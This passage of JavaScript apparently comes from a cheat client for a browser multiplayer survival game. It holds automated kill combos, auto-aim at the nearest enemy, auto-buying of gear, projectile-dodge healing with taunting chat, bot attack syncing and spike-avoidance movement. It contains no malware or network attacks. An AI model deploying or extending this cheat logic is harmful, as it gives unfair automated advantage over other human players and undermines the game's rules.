                    player.buildIndex != player.items[1] && selectToBuild(player.items[1]);
                  } else {
                    if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                      selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                    }
                  }
                } else {
                  bQ(22, 19);
                  if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                  }
                }
              } else {
                bQ(6, 12);
                if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                  selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                }
              }
            } else {
              biomeGear();
              bQ(11, 1);
              if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
              }
            }
            return {
              dir: near.aim2 + Math.PI,
              action: 0
            };
          } else if (dst > goal.b) {
            if (dst <= goal.h) {
              if (dst <= goal.f) {
                if (dst <= goal.d) {
                  bQ(40, 9);
                  if (configs.slowOT) {
                    player.buildIndex != player.items[1] && selectToBuild(player.items[1]);
                  } else {
                    if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                      selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                    }
                  }
                } else {
                  bQ(22, 19);
                  if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                  }
                }
              } else {
                bQ(6, 12);
                if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                  selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                }
              }
            } else {
              biomeGear();
              bQ(11, 1);
              if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
              }
            }
            return {
              dir: near.aim2,
              action: 0
            };
          }
          return {
            dir: undefined,
            action: 0
          };
        }
      } else {
        this.ticking = false;
        return {
          dir: undefined,
          action: 0
        };
      }
    }
    /** wait 1 tick for better quality */
    this.bowMovement = function () {
      let moveMent = this.gotoGoal(685, 3);
      if (moveMent.action) {
        if (player.reloads[53] == 0 && !this.isTrue) {
          this.rangeType("ageInsta");
        } else {
          packet("9", moveMent.dir, 1);
        }
      } else {
        packet("9", moveMent.dir, 1);
      }
    }
    this.tickMovement = function () {
      let moveMent = this.gotoGoal(([10, 14].includes(player.weapons[1]) && player.y2 > config.snowBiomeTop) ? 220 : player.weapons[1] == 15 ? 220 : player.y2 <= config.snowBiomeTop ? [10, 14].includes(player.weapons[1]) ? 240 : 235 : 240, 7);
      if (moveMent.action) {
        if ((player.primaryVariant > 1 && ![6, 22].includes(near.skinIndex)) && player.reloads[53] == 0 && !this.isTrue) {
          ([10, 14].includes(player.weapons[1]) && player.y2 > config.snowBiomeTop) || (player.weapons[1] == 15) ? this.oneTickType() : this.threeOneTickType();
        } else {
          packet("9", moveMent.dir, 1);
        }
      } else {
        packet("9", moveMent.dir, 1);
      }
    }
    this.kmTickMovement = function () {
      let moveMent = this.gotoGoal(240, 3);
      if (moveMent.action) {
        if (near.skinIndex != 22 && player.reloads[53] == 0 && !this.isTrue && ((game.tick - near.poisonTick) % config.serverUpdateRate == 8)) {
          this.kmTickType();
        } else {
          packet("9", moveMent.dir, 1);
        }
      } else {
        packet("9", moveMent.dir, 1);
      }
    }
    this.boostTickMovement = function () {
      let dist = player.weapons[1] == 9 ? 365 : player.weapons[1] == 12 ? 380 : player.weapons[1] == 13 ? 390 : player.weapons[1] == 15 ? 365 : 370;
      let actionDist = player.weapons[1] == 9 ? 2 : player.weapons[1] == 12 ? 1.5 : player.weapons[1] == 13 ? 1.5 : player.weapons[1] == 15 ? 2 : 3;
      let moveMent = this.gotoGoal(dist, actionDist, 7);
      if (moveMent.action) {
        if (player.reloads[53] == 0 && !this.isTrue) {
          this.boostTickType();
        } else {
          packet("9", moveMent.dir, 1);
        }
      } else {
        packet("9", moveMent.dir, 1);
      }
    }
    /** wait 1 tick for better quality */
    this.perfCheck = function (pl, nr) {
      if (nr.weaponIndex == 11 && UTILS.getAngleDist(nr.aim2 + Math.PI, nr.d2) <= config.shieldAngle) return false;
      if (![9, 12, 13, 15].includes(player.weapons[1])) return true;
      let pjs = {
        x: nr.x2 + (70 * Math.cos(nr.aim2 + Math.PI)),
        y: nr.y2 + (70 * Math.sin(nr.aim2 + Math.PI))
      };
      if (UTILS.lineInRect(pl.x2 - pl.scale, pl.y2 - pl.scale, pl.x2 + pl.scale, pl.y2 + pl.scale, pjs.x, pjs.y, pjs.x, pjs.y)) {
        return true;
      }
      let finds = ais.filter(tmp => tmp.visible).find((tmp) => {
        if (UTILS.lineInRect(tmp.x2 - tmp.scale, tmp.y2 - tmp.scale, tmp.x2 + tmp.scale, tmp.y2 + tmp.scale, pjs.x, pjs.y, pjs.x, pjs.y)) {
          return true;
        }
      });
      if (finds) return false;
      finds = gameObjects.filter(tmp => tmp.active).find((tmp) => {
        let tmpScale = tmp.getScale();
        if (!tmp.ignoreCollision && UTILS.lineInRect(tmp.x - tmpScale, tmp.y - tmpScale, tmp.x + tmpScale, tmp.y + tmpScale, pjs.x, pjs.y, pjs.x, pjs.y)) {
          return true;
        }
      });
      if (finds) return false;
      return true;
    }
  }
};

class Autobuy {
  constructor(buyHat, buyAcc) {
    this.hat = function () {
      buyHat.forEach((id) => {
        let find = findID(hats, id);
        if (find && !player.skins[id] && player.points >= find.price)
          packet("c", 1, id, 0);
      });
    };
    this.acc = function () {
      buyAcc.forEach((id) => {
        let find = findID(accessories, id);
        if (find && !player.tails[id] && player.points >= find.price)
          packet("c", 1, id, 1);
      });
    };
  }
}

class Damages {
  constructor(items) {
    this.calcDmg = function (dmg, val) {
      return dmg * val;
    };
    this.getAllDamage = function (dmg) {
      return [
        this.calcDmg(dmg, 0.75),
        dmg,
        this.calcDmg(dmg, 1.125),
        this.calcDmg(dmg, 1.5),
      ];
    };
    this.weapons = [];
    for (let i = 0; i < items.weapons.length; i++) {
      let wp = items.weapons[i];
      let name =
        wp.name.split(" ").length <= 1
          ? wp.name
          : wp.name.split(" ")[0] + "_" + wp.name.split(" ")[1];
      this.weapons.push(this.getAllDamage(i > 8 ? wp.Pdmg : wp.dmg));
      this[name] = this.weapons[i];
    }
  }
}

let tmpList = [];
let UTILS = new Utils();
let items = new Items();
let objectManager = new Objectmanager(GameObject, gameObjects, UTILS, config);
let store = new Store();
let hats = store.hats;
let accessories = store.accessories;
let projectileManager = new ProjectileManager(
  Projectile,
  projectiles,
  players,
  ais,
  objectManager,
  items,
  config,
  UTILS,
);
let aiManager = new AiManager(ais, AI, players, items, null, config, UTILS);
let textManager = new Textmanager();

let traps = new Traps(UTILS, items);
let instaC = new Instakill();
let autoBuy = new Autobuy([40, 6, 7, 22, 53, 15, 31], [11, 21, 18, 13]);

let lastDeath;
let minimapData;
let mapMarker = {};
let mapPings = [];
let playerEnemyMarkers = [];
let botEnemyTracking = new Map();
let tmpPing;

let antiinsta = true;
let antiinsta1 = false;

function sendChat(message) {
  packet("6", message.slice(0, 30));
}

let runAtNextTick = [];

function checkProjectileHolder(x, y, dir, range, speed, indx, layer, sid) {
  let weaponIndx =
    indx == 0 ? 9 : indx == 2 ? 12 : indx == 3 ? 13 : indx == 5 && 15;
  let projOffset = config.playerScale * 2;
  let projXY = {
    x: indx == 1 ? x : x - projOffset * Math.cos(dir),
    y: indx == 1 ? y : y - projOffset * Math.sin(dir),
  };
  let nearPlayer = players
    .filter((e) => e.visible && UTILS.getDist(projXY, e, 0, 2) <= e.scale)
    .sort(function (a, b) {
      return UTILS.getDist(projXY, a, 0, 2) - UTILS.getDist(projXY, b, 0, 2);
    })[0];
  if (nearPlayer) {
    if (indx == 1) {
      nearPlayer.shooting[53] = 1;
    } else {
      nearPlayer.shootIndex = weaponIndx;
      nearPlayer.shooting[1] = 1;
      antiProj(nearPlayer, dir, range, speed, indx, weaponIndx);
    }
  }
}
let projectileCount = 0;

function antiProj(tmpObj, dir, range, speed, index, weaponIndex) {
  if (!tmpObj.isTeam(player)) {
    tmpDir = UTILS.getDirect(player, tmpObj, 2, 2);
    if (UTILS.getAngleDist(tmpDir, dir) <= 0.2) {
      tmpObj.bowThreat[weaponIndex]++;
      if (index == 5) {
        projectileCount++;
      }
      setTimeout(() => {
        tmpObj.bowThreat[weaponIndex]--;
        if (index == 5) {
          projectileCount--;
        }
      }, range / speed);
      if (
        tmpObj.bowThreat[9] >= 1 &&
        (tmpObj.bowThreat[12] >= 1 || tmpObj.bowThreat[15] >= 1)
      ) {
        place(1, tmpObj.aim2);
        my.anti0Tick = 4;
        if (!recording) {
          sendChat("Abyss | Skill Issue?");
        }
        if (!my.antiSync) {
          antiSyncHealing(4);
        }
      } else {
        if (projectileCount >= 2) {
          place(1, tmpObj.aim2);
          healer();
          if (!recording) {
            sendChat("Imagine Syncing");
          }
          if (AB.Menu.AutoHat) buyEquip(22, 13);
          my.anti0Tick = 4;
          if (!my.antiSync) {
            antiSyncHealing(4);
          }
        } else {
          if (projectileCount === 1) {
            if (AB.Menu.AutoHat) buyEquip(6, 13);
          } else {
            if (projectileCount >= 2) {
              return Math.ceil(
                (100 - player.health) / items.list[player.items[0]].healing,
              );
              healer();
              if (AB.Menu.AutoHat) buyEquip(6, 0);
            }
          }
        }
      }
    }
  }
}

function showItemInfo(item, isWeapon, isStoreItem) {
  if (player && item) {
    UTILS.removeAllChildren(itemInfoHolder);
    itemInfoHolder.classList.add("visible");
    UTILS.generateElement({
      id: "itemInfoName",
      text: UTILS.capitalizeFirst(item.name),
      parent: itemInfoHolder,
    });
    UTILS.generateElement({
      id: "itemInfoDesc",
      text: item.desc,
      parent: itemInfoHolder,
    });
    if (isStoreItem) {
    } else if (isWeapon) {
      UTILS.generateElement({
        class: "itemInfoReq",
        text: !item.type ? "primary" : "secondary",
        parent: itemInfoHolder,
      });
    } else {
      for (let i = 0; i < item.req.length; i += 2) {
        UTILS.generateElement({
          class: "itemInfoReq",
          html:
            item.req[i] +
            "<span class='itemInfoReqVal'> x" +
            item.req[i + 1] +
            "</span>",
          parent: itemInfoHolder,
        });
      }
      if (item.group.limit) {
        UTILS.generateElement({
          class: "itemInfoLmt",
          text:
            (player.itemCounts[item.group.id] || 0) +
            "/" +
            (config.isSandbox
              ? item.group.sandboxLimit || 99
              : item.group.limit),
          parent: itemInfoHolder,
        });
      }
    }
  } else {
    itemInfoHolder.classList.remove("visible");
  }
}

window.addEventListener("resize", UTILS.checkTrusted(resize));

function resize() {
  screenWidth = window.innerWidth;
  screenHeight = window.innerHeight;
  let scaleFillNative =
    Math.max(screenWidth / maxScreenWidth, screenHeight / maxScreenHeight) *
    pixelDensity;
  gameCanvas.width = screenWidth * pixelDensity;
  gameCanvas.height = screenHeight * pixelDensity;
  gameCanvas.style.width = screenWidth + "px";
  gameCanvas.style.height = screenHeight + "px";
  mainContext.setTransform(
    scaleFillNative,
    0,
    0,
    scaleFillNative,
    (screenWidth * pixelDensity - maxScreenWidth * scaleFillNative) / 2,
    (screenHeight * pixelDensity - maxScreenHeight * scaleFillNative) / 2,
  );
}
resize();

var usingTouch;
const mals = document.getElementById("touch-controls-fullscreen");
mals.style.display = "block";
mals.addEventListener("mousemove", gameInput, false);

function gameInput(e) {
  mouseX = e.clientX;
  mouseY = e.clientY;
}
let clicks = {
  left: false,
  middle: false,
  right: false,
};
mals.addEventListener("mousedown", mouseDown, false);

let selectedInstaType = "revInsta";

function mouseDown(e) {
  if (attackState != 1) {
    attackState = 1;
    if (e.button == 0) {
      clicks.left = true;
    } else if (e.button == 1) {
      clicks.middle = true;
      if (selectedInstaType === "revInsta") {
        instaC.changeType("rev");
      } else if (selectedInstaType === "noBullInsta") {
        instaC.changeType("nobull");
      } else if (selectedInstaType === "rangeInsta") {
        instaC.rangeType("rangeInsta");
      } else if (selectedInstaType === "normalInsta") {
        instaC.changeType("normal");
      }
      bottics.forEach((c) => {
        if (c && c.syncing !== undefined) {
          c.syncing = true;
          try {
            if (c.near && c.Bot && c.Bot.alive) {
              const angle = Math.atan2(c.near.y2 - c.Bot.y2, c.near.x2 - c.Bot.x2);
              c.syncMoveDir = angle;
              const sec = c.Bot.weapons && c.Bot.weapons[1];
              if (typeof c.sync === "function" && sec !== undefined && c.Bot.reloads?.[sec] === 0) {
                c.sync();
              } else if (typeof c.syncHit === "function") {
                c.syncHit();
              }
            }
          } catch (err) { }
        }
      });
    } else if (e.button == 2) {
      clicks.right = true;
    }
  }
}
mals.addEventListener("mouseup", UTILS.checkTrusted(mouseUp));

function mouseUp(e) {
  if (attackState != 0) {
    attackState = 0;
    if (e.button == 0) {
      clicks.left = false;
    } else if (e.button == 1) {
      clicks.middle = false;
      bottics.forEach((c) => {
        if (c) {
          c.syncing = false;
          c.syncMoveDir = null;
        }
      });
    } else if (e.button == 2) {
      clicks.right = false;
    }
  }
}
mals.addEventListener("wheel", wheel, false);

let wbe = 1.25;
let wbeTarget = 1.25;
const wbeMin = 0.45;
const wbeSmooth = 0.12;

function updateSmoothZoom() {
  if (Math.abs(wbe - wbeTarget) > 0.001) {
    wbe += (wbeTarget - wbe) * wbeSmooth;
    maxScreenWidth = config.maxScreenWidth * wbe;
    maxScreenHeight = config.maxScreenHeight * wbe;
    resize();
  }
  requestAnimationFrame(updateSmoothZoom);
}
requestAnimationFrame(updateSmoothZoom);

const instaTypes = ["revInsta", "noBullInsta", "rangeInsta", "normalInsta"];
const instaDisplayNames = {
  revInsta: "Rev Insta",
  noBullInsta: "No Bull Insta",
  rangeInsta: "Range Insta",
  normalInsta: "Normal Insta",
};

function wheel(e) {
  if (inGame) {
    e.preventDefault();
    if (e.shiftKey) {
      const currentIndex = instaTypes.indexOf(selectedInstaType);
      const direction = e.deltaY < 0 ? -1 : 1;
      const nextIndex =
        (currentIndex + direction + instaTypes.length) % instaTypes.length;
      selectedInstaType = instaTypes[nextIndex];
      textManager.showText(
        player.x,
        player.y,
        30,
        0.18,
        500,
        instaDisplayNames[selectedInstaType],
        "#8ecc51",
      );
    } else {
      const delta = e.deltaY > 0 ? 0.15 : -0.15;
      wbeTarget = Math.max(wbeMin, wbeTarget + delta);
    }
  }
}

function getMoveDir() {
  let dx = 0;
  let dy = 0;
  for (let key in moveKeys) {
    let tmpDir = moveKeys[key];
    dx += !!keys[key] * tmpDir[0];
    dy += !!keys[key] * tmpDir[1];
  }
  return dx == 0 && dy == 0 ? undefined : Math.atan2(dy, dx);
}

function getSafeDir() {
  if (!player) {
    return 0;
  }
  if (!player.lockDir) {
    lastDir = Math.atan2(mouseY - screenHeight / 2, mouseX - screenWidth / 2);
  }
  return lastDir || 0;
}

let plusDir = 0;
let lastSpin = Date.now();
let autoSpinAngle = null;
let autoSpinLastTime = 0;

function getAutoSpinDir() {
  const nowMs = performance.now();
  const speedDeg = Math.max(0, Number(AB.Menu.AutoSpinSpeed ?? 360) || 0);
  const dirSign = AB.Menu.AutoSpinDir === "Right" ? 1 : -1;

  if (!autoSpinLastTime) autoSpinLastTime = nowMs;
  const dt = Math.max(0, nowMs - autoSpinLastTime);
  autoSpinLastTime = nowMs;

  if (autoSpinAngle == null) autoSpinAngle = lastDir || getSafeDir();
  autoSpinAngle += dirSign * (speedDeg * (Math.PI / 180)) * (dt / 1000);

  const twoPi = Math.PI * 2;
  autoSpinAngle = ((autoSpinAngle % twoPi) + twoPi) % twoPi;
  return autoSpinAngle;
}

function getAttackDir() {
  const now = Date.now();

  if (player && now - lastSpin >= 235 && !(clicks.right || clicks.left)) {
    plusDir += Math.random() * (Math.PI * 2);
    lastSpin = now;
  }

  if (!player) {
    return "0";
  }

  const primaryWeapon = player.weapons[0];
  const secondaryWeapon = player.weapons[1];
  const primaryReload = player.reloads[primaryWeapon];
  const secondaryReload = player.reloads[secondaryWeapon];
  const primaryInRange =
    near &&
    near.dist2 !== undefined &&
    near.dist2 <= items.weapons[primaryWeapon].range + near.scale * 1.8;

  function getBestTargetDirection() {
    if (enemy.length) {
      return near.aim2;
    }
    return getSafeDir();
  }

  if (
    my.autoAim ||
    ((clicks.left || (useWasd && primaryInRange && !traps.inTrap)) &&
      primaryReload === 0)
  ) {
    lastDir = getBestTargetDirection();
  } else if (
    clicks.right &&
    (secondaryWeapon === 10 ? secondaryReload : primaryReload) === 0
  ) {
    lastDir = getSafeDir();
  } else if (traps.inTrap) {
    lastDir = traps.aim;
  } else if (!player.lockDir) {
    if (AB.Menu.AutoSpin) {
      lastDir = getAutoSpinDir();
    } else {
      if (!autos.stopspin || !useWasd) {
        lastDir = getSafeDir();
      }
    }
  }

  lastDir = smoothTransition(lastDir);

  return lastDir;
}

function smoothTransition(targetDir) {
  const smoothingFactor = 0.1;
  return (1 - smoothingFactor) * lastDir + smoothingFactor * targetDir;
}

function getVisualDir() {
  if (!player) {
    return 0;
  }
  if (traps.inTrap) {
    lastDir = traps.aim;
  } else if (
    AB.Menu.AutoSpin &&
    !player.lockDir &&
    !(clicks.left || clicks.right)
  ) {
    lastDir = getAutoSpinDir();
  } else {
    lastDir = getSafeDir();
  }
  return lastDir || 0;
}

function keysActive() {
  if (isChatActive()) return false;
  return (
    allianceMenu.style.display != "block" &&
    chatHolder.style.display != "block" &&
    !AB.Chats.focused
  );
}

function keyDown(event) {
  let keyNum = event.which || event.keyCode || 0;
  if (keyNum == 27 && AB.Menu.visible) return;
  if (AB.Menu.visible) return;
  if (player && player.alive && keysActive()) {
    if (!keys[keyNum]) {
      keys[keyNum] = 1;
      macro[event.key] = 1;
      if (moveKeys[keyNum]) {
        my.lastWASDTime = performance.now();
        my.idleHatActive = false;
      }
      let InstaKey = AB.Menu.InstaKey;
      if (event.key.toLowerCase() == InstaKey.toLowerCase()) {
        if (AB.Menu.AutoInsta) {
          instaC.wait = !instaC.wait;
        } else {
          if (selectedInstaType === "revInsta") {
            instaC.changeType("rev");
          } else if (selectedInstaType === "noBullInsta") {
            instaC.changeType("nobull");
          } else if (selectedInstaType === "rangeInsta") {
            instaC.rangeType("rangeInsta");
          } else if (selectedInstaType === "normalInsta") {
            instaC.changeType("normal");
          }
        }
      } else if (keyNum == 109) {
        recording = !recording;
        console.log(recording);
      } else if (keyNum == 69) {
        sendAutoGather();
      } else if (keyNum == 67) {
        updateMapMarker();
      } else if (player.weapons[keyNum - 49] != undefined) {
        player.weaponCode = player.weapons[keyNum - 49];
      } else if (moveKeys[keyNum]) {
        sendMoveDir();
      } else if (event.key == "m") {
        mills.placeSpawnPads = !mills.placeSpawnPads;
      } else if (event.key == "z") {
        mills.place = !mills.place;
      } else if (event.key == "Z") {
        typeof window.debug == "function" && window.debug();
      } else if (keyNum == 32) {
        packet("d", 1, getSafeDir(), 1);
        packet("d", 0, getSafeDir(), 1);
      }
    }
  }
}

addEventListener("keydown", UTILS.checkTrusted(keyDown));

function keyUp(event) {
  if (player && player.alive) {
    let keyNum = event.which || event.keyCode || 0;
    if (keysActive()) {
      if (keys[keyNum]) {
        keys[keyNum] = 0;
        macro[event.key] = 0;
        if (moveKeys[keyNum]) {
          sendMoveDir();
          my.lastWASDTime = performance.now();
          my.idleHatActive = false;
        } else if (event.key == ",") {
          player.sync = false;
        }
      }
    }
  }
}

window.addEventListener("keyup", UTILS.checkTrusted(keyUp));

function safeWalkMoveDir(desiredDir) {
  if (!configs.safeWalk || !player || !player.alive) return desiredDir;
  if (desiredDir === undefined) return undefined;

  safeWalkMoveDir._correcting = false;

  const mode = ((configs.SafeWalkType || "MoveAway") + "").toLowerCase();
  const px = player.x2 ?? player.x;
  const py = player.y2 ?? player.y;
  const pvx = player.xVel ?? 0;
  const pvy = player.yVel ?? 0;
  const curSpeed = Math.hypot(pvx, pvy);
  const predictTicks = 2;
  const ppx = px + pvx * predictTicks;
  const ppy = py + pvy * predictTicks;
  const playerScale = player.scale || 35;
  const mapScale = config?.mapScale ?? 0;
  const snowBiomeTop = config?.snowBiomeTop ?? 0;
  const desertTop = mapScale > 0 && snowBiomeTop > 0 ? mapScale - snowBiomeTop : 0;

  const spikes = gameObjects.filter((tmp) => {
    if (!tmp || !tmp.active) return false;
    if (tmp.ignoreCollision || tmp.trap || tmp.teleport) return false;
    if (
      tmp.type == 1 &&
      ((tmp.y >= 12000) || (desertTop > 0 && tmp.y >= desertTop))
    ) {
      return true;
    }
    if (!(tmp.dmg || tmp.pDmg)) return false;
    if (tmp.owner == null) return true;
    if (typeof tmp.isTeamObject !== "function") return false;
    return !tmp.isTeamObject(player);
  });

  if (!spikes.length) return desiredDir;

  if (mode === "moveaway" || mode === "move") {
    const speedPad = Math.max(playerScale / 1.5, curSpeed * 2);
    const weaponId = items.weapons.indexOf(0);
    const weaponInfo = items?.weapons?.[weaponId];
    const weaponRange = weaponInfo?.range || 0;
    const baseDesiredDist = weaponRange > 0 ? weaponRange + playerScale : 0;

    const desiredX = Math.cos(desiredDir);
    const desiredY = Math.sin(desiredDir);
    let inputX = desiredX;
    let inputY = desiredY;

    let avoidX = 0;
    let avoidY = 0;
    let strongest = 0;
    let inHardZone = false;
    let bestSpikeDir = 0;
    let bestDist = Infinity;

    for (const spike of spikes) {
      const dxp = (spike.x - ppx);
      const dyp = (spike.y - ppy);
      const dist = Math.hypot(dxp, dyp);
      const rawR =
        spike.isItem
          ? (spike.getScale ? spike.getScale(0.6, spike.isItem) : spike.scale)
          : spike.scale;
      const spikeR = (spike.type == 1 ? (spike.scale || rawR) + 10 : rawR) || 50;
      const minSafe = spikeR + playerScale + 2;
      const desiredDist = Math.max(minSafe, baseDesiredDist);
      const slowStart = desiredDist + 25;
      if (dist > slowStart) continue;

      const toSpikeX = dxp / (dist || 1);
      const toSpikeY = dyp / (dist || 1);
      const approachDot = desiredX * toSpikeX + desiredY * toSpikeY;
      if (approachDot > 0) {
        const interceptStart = desiredDist + 10;
        const rawI = (interceptStart - dist) / (interceptStart - desiredDist || 1);
        const i = Math.max(0, Math.min(1, rawI));
        if (i > 0) {
          const into = inputX * toSpikeX + inputY * toSpikeY;
          if (into > 0) {
            inputX -= toSpikeX * into * i;
            inputY -= toSpikeY * into * i;
          }
        }
      }

      const spikeDir = Math.atan2(spike.y - ppy, spike.x - ppx);
      if (dist < bestDist) {
        bestDist = dist;
        bestSpikeDir = spikeDir;
      }

      const rawT = (slowStart - dist) / (slowStart - desiredDist || 1);
      const t = Math.max(0, Math.min(1, rawT));
      const s = t * t * (3 - 2 * t);
      if (s <= 0) continue;

      const awayX = -Math.cos(spikeDir);
      const awayY = -Math.sin(spikeDir);
      const awayDot = desiredX * awayX + desiredY * awayY;
      const aheadFactor = Math.max(0.12, Math.min(1, (approachDot + 0.15) / 1.15));
      const dirFactor = awayDot > 0.2 ? 0.2 : 1;
      const force =
        (dist <= desiredDist ? 2.2 : s * s * 1.1) * dirFactor * aheadFactor;

      avoidX += awayX * force;
      avoidY += awayY * force;

      if (dist <= desiredDist) inHardZone = true;
      if (s > strongest) strongest = s;
    }

    if (bestDist === Infinity) return desiredDir;

    safeWalkMoveDir._correcting = strongest > 0.01 || inHardZone;

    let outX = inputX + avoidX;
    let outY = inputY + avoidY;
    if (inHardZone) {
      outX = avoidX;
      outY = avoidY;
    }
    if (!outX && !outY) {
      outX = -Math.cos(bestSpikeDir);
      outY = -Math.sin(bestSpikeDir);
    }
    if (curSpeed > 0.01 && safeWalkMoveDir._correcting) {
      const cvx = -pvx / curSpeed;
      const cvy = -pvy / curSpeed;
      const c = Math.min(1, curSpeed / Math.max(1, speedPad)) * 1.1;
      outX += cvx * c;
      outY += cvy * c;
    }

    return Math.atan2(outY, outX);
  }

  const moveDirX = Math.cos(desiredDir);
  const moveDirY = Math.sin(desiredDir);
  for (const spike of spikes) {
    const dx = spike.x - ppx;
    const dy = spike.y - ppy;
    const dist = Math.hypot(dx, dy);
    const projectionLength = dx * moveDirX + dy * moveDirY;
    const rawR =
      spike.isItem
        ? (spike.getScale ? spike.getScale(0.6, spike.isItem) : spike.scale)
        : spike.scale;
    const spikeR = (spike.type == 1 ? (spike.scale || rawR) + 10 : rawR) || 50;
    const speedPad = Math.max(playerScale / 1.5, curSpeed * 2);
    const collisionRange = spikeR + 75 + playerScale + speedPad * 0.6;
    const lookAhead = Math.max(169, collisionRange + speedPad * 0.75);
    if (projectionLength <= 0 || projectionLength > lookAhead) continue;

    const closestX = ppx + projectionLength * moveDirX;
    const closestY = ppy + projectionLength * moveDirY;
    const distanceToSpike = Math.hypot(
      closestX - spike.x,
      closestY - spike.y,
    );
    if (distanceToSpike > playerScale + spikeR) continue;

    if (dist <= collisionRange) return undefined;
  }

  return desiredDir;
}

function sendMoveDir() {
  if (found) {
    if (lastMoveDir !== undefined) {
      packet("a", undefined, 1);
      lastMoveDir = undefined;
      sendMoveDir._lastSendAt = performance.now();
    }
    return;
  }

  const desired = getMoveDir();
  const newMoveDir = safeWalkMoveDir(desired);
  const now = performance.now();
  const minDelta = safeWalkMoveDir._correcting ? 0.06 : 0.18;
  const minInterval = 60;
  const lastAt = sendMoveDir._lastSendAt || 0;
  const allowMovePacket = !my.autoPush || safeWalkMoveDir._correcting;

  if (newMoveDir === undefined) {
    if (allowMovePacket && (lastMoveDir !== undefined || now - lastAt > minInterval)) {
      packet("a", undefined, 1);
      lastMoveDir = undefined;
      sendMoveDir._lastSendAt = now;
    }
    return;
  }

  if (lastMoveDir === undefined) {
    if (allowMovePacket) {
      packet("a", newMoveDir, 1);
      lastMoveDir = newMoveDir;
      sendMoveDir._lastSendAt = now;
    }
    return;
  }

  const delta = Math.abs(UTILS.getAngleDist(lastMoveDir, newMoveDir));
  if (delta > minDelta || now - lastAt > minInterval) {
    if (allowMovePacket) {
      packet("a", newMoveDir, 1);
    }
    lastMoveDir = newMoveDir;
    sendMoveDir._lastSendAt = now;
  }
}

function bindEvents() { }
bindEvents();

let isItemSetted = [];

function updateItemCountDisplay(index = undefined) {
  for (let i = 3; i < items.list.length; ++i) {
    let id = items.list[i].group.id;
    let tmpI = items.weapons.length + i;
    if (!isItemSetted[tmpI]) {
      isItemSetted[tmpI] = document.createElement("div");
      isItemSetted[tmpI].id = "itemCount" + tmpI;
      getEl("actionBarItem" + tmpI).appendChild(isItemSetted[tmpI]);
      isItemSetted[tmpI].style = `
                        display: block;
                        position: absolute;
                        padding-left: 5px;
                        font-size: 2em;
                        color: #fff;
                        `;
      isItemSetted[tmpI].innerHTML = player.itemCounts[id] || 0;
    } else {
      if (index == id)
        isItemSetted[tmpI].innerHTML = player.itemCounts[index] || 0;
    }
  }
}

function autoPush() {
  let nearTrap = gameObjects
    .filter(
      (tmp) =>
        tmp.trap &&
        tmp.active &&
        tmp.isTeamObject(player) &&
        UTILS.getDist(tmp, near, 0, 2) <= near.scale + tmp.getScale() + 5,
    )
    .sort(function (a, b) {
      return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
    })[0];

  if (nearTrap) {
    let spike = gameObjects
      .filter(
        (tmp) =>
          tmp.dmg &&
          tmp.active &&
          tmp.isTeamObject(player) &&
          UTILS.getDist(tmp, nearTrap, 0, 0) <=
          near.scale + nearTrap.scale + tmp.scale,
      )
      .sort(function (a, b) {
        return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
      })[0];

    if (spike) {
      let pushAngle = Math.atan2(near.y2 - spike.y, near.x2 - spike.x);

      let pos = {
        x: spike.x + 250 * Math.cos(UTILS.getDirect(near, spike, 2, 0)),
        y: spike.y + 250 * Math.sin(UTILS.getDirect(near, spike, 2, 0)),
        x2:
          spike.x +
          (UTILS.getDist(near, spike, 2, 0) + player.scale) *
          Math.cos(UTILS.getDirect(near, spike, 2, 0)) +
          Math.cos(25),
        y2:
          spike.y +
          (UTILS.getDist(near, spike, 2, 0) + player.scale) *
          Math.sin(UTILS.getDirect(near, spike, 2, 0)) +
          Math.sin(25),
      };

      let finds = gameObjects
        .filter((tmp) => tmp.active)
        .find((tmp) => {
          let tmpScale = tmp.getScale();
          if (
            !tmp.ignoreCollision &&
            UTILS.lineInRect(
              tmp.x - tmpScale,
              tmp.y - tmpScale,
              tmp.x + tmpScale,
              tmp.y + tmpScale,
              player.x2,
              player.y2,
              pos.x2,
              pos.y2,
            )
          ) {
            return true;
          }
        });

      if (finds) {
        if (my.autoPush) {
          my.autoPush = false;
          packet("9", undefined, 1);
        }
      } else {
        my.autoPush = true;
        instaC.setAutoPush();
        instaC.lastTarget = near?.name || "Unknown";
        my.pushData = {
          x: spike.x + Math.cos(pushAngle),
          y: spike.y + Math.sin(pushAngle),
          x2: player.x2 + 30,
          y2: player.y2 + 30,
        };

        let point = {
          x: near.x2 + Math.cos(pushAngle) * 30,
          y: near.y2 + Math.sin(pushAngle) * 60,
        };

        let dir = Math.atan2(point.y - player.y2, point.x - player.x2);

        packet("9", dir, 1);
        let scale = player.scale / 10;
        if (
          UTILS.lineInRect(
            player.x2 - scale,
            player.y2 - scale,
            player.x2 + scale,
            player.y2 + scale,
            near.x2,
            near.y2,
            pos.x,
            pos.y,
          )
        ) {
          packet("9", near.aim2, 1);
        } else {
          packet("9", UTILS.getDirect(pos, player, 2, 2), 1);
        }
      }
    } else {
      if (my.autoPush) {
        my.autoPush = false;
